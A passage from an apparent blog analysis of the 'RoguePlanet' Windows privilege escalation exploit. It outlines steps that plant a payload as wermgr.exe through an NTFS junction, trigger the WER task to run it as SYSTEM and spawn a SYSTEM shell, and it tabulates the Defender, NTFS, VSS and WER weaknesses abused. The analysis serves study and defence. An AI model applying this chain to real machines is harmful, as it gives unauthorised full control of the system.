│    → DeviceIoControl(hdir, FSCTL_DELETE_REPARSE_POINT)                      │
│    → Open temp file with FILE_OVERWRITE_IF                                   │
│    → Read own EXE from disk → Write into temp file                          │
└──────────────────────────────────────────────────────────────────────────────┘
```

```
┌──────────────────────────────────────────────────────────────────────────────┐
│ PHASE 5: SYSTEM Execution                                                    │
│                                                                              │
│ 15. Move payload to %TEMP%\RP_<GUID2>\System32\wermgr.exe                   │
│    → MoveToTempDir(htempfile) → renames our payload to a safe location      │
│                                                                              │
│ 16. Junction %TEMP%\RP_<GUID> → C:\Windows                                   │
│    → Now %TEMP%\RP_<GUID>\System32\wermgr.exe → C:\Windows\System32\        │
│      wermgr.exe → our payload                                                │
│                                                                              │
│ 17. Trigger WER QueueReporting task (runs as SYSTEM)                         │
│    → Task executes %SystemRoot%\System32\wermgr.exe                          │
│    → Resolves through our junction to the payload in %TEMP%                  │
│                                                                              │
│ 18. Payload runs as SYSTEM:                                                  │
│    → IsRunningAsLocalSystem() → true                                         │
│    → Connect to \\.\pipe\RoguePlanet                                         │
│    → GetNamedPipeServerSessionId → get user session ID                      │
│    → DuplicateTokenEx + SetTokenInformation (set session ID)                 │
│    → CreateProcessAsUser → conhost.exe in user session                       │
│    → SYSTEM shell!                                                           │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

## Vulnerabilities Exploited

| # | Vulnerability | Windows Component | Fixed |
|---|--------------|-------------------|-------|
| 1 | MpClient API accessible from user mode | Windows Defender | No — "by design" |
| 2 | Defender's quarantine creates predictable temp filenames (`Temp\TMPXXXX.tmp`) | Defender | No |
| 3 | Race window in Defender cleanup — files not locked during quarantine | Defender | No |
| 4 | Junction redirection not validated by file operations | NTFS I/O Manager | No |
| 5 | Oplocks not handled by Defender during cleanup | Defender | No |
| 6 | VSS exposed via `\Device` Object Manager directory | VSS / Object Manager | No |
| 7 | WER task runs `wermgr.exe` without signature check | WER | No |
| 8 | No access check on `CreateJunction` for non-admin | NTFS | No — "feature" |

---

## Key Takeaways

- **NTAPI over Win32 API** — Direct syscall interface provides more control and bypasses some security checks
- **Oplocks as timing oracle** — A file-system primitive for network caching, repurposed as a synchronizaton signal
- **VSS as side-channel** — Volume Shadow Copies, normally a backup feature, reveal Defender's activity timeline
- **Junction chains** — Reparse points are trustless; any user can redirect paths, and system components don't verify
- **CPU saturation widens race windows** — Poseidon threads are an elegant way to increase exploit reliability
- **Self-replicating binary** — Same EXE handles both user-level exploit and SYSTEM-level payload roles

---

## The Human Side

The author's pain is visible in the code — a raw comment at line 78978:

```cpp
// I really hate doing this, I really do, but I don't have any choices,
// For the first time in my life, my tears burned my eyes adding more pain to the existing agony.
// You know that Microsoft, why do you keep doing this to me...
```

And the README:

> *"The race condition part is a bit interesting, I believe (but not sure) that a redesign of the PoC can make it achieve a 100% success rate regardless of the conditions but honestly I'm done with this bug."*

RoguePlanet is a testament to the depth of Windows internals knowledge required for modern privilege escalation. It chains a dozen low-level mechanisms — none of which are "vulnerabilities" in isolation — into a SYSTEM shell.

---

## Resources

- [RoguePlanet source code (GitHub)](https://github.com/Nightmare-Eclipse/RoguePlanet)
- [FSCTL_REQUEST_OPLOCK documentation (MSDN)](https://learn.microsoft.com/en-us/windows/win32/api/winioctl/ni-winioctl-fsctl_request_oplock)
- [Windows Internals 7th Ed. (Pavel Yosifovich, Mark Russinovich, David Solomon, Alex Ionescu)](https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals)
- [NTFS Reparse Points](https://learn.microsoft.com/en-us/windows/win32/fileio/reparse-points)
- [Volume Shadow Copy Service](https://learn.microsoft.com/en-us/windows/win32/vss/volume-shadow-copy-service-overview)
- [Windows Defender MpClient (undocumented)](https://learn.microsoft.com/en-us/defender-endpoint/)
- [Windows Error Reporting](https://learn.microsoft.com/en-us/windows/win32/wer/windows-error-reporting)
- [Named Pipe Security and Sessions](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security)

[Windows](/tags/windows/) [Privilege Escalation](/tags/privilege-escalation/) [Exploit Dev](/tags/exploit-dev/) [Defender](/tags/defender/) [LPE](/tags/lpe/) [Race Condition](/tags/race-condition/) [C++](/tags/cpp/)
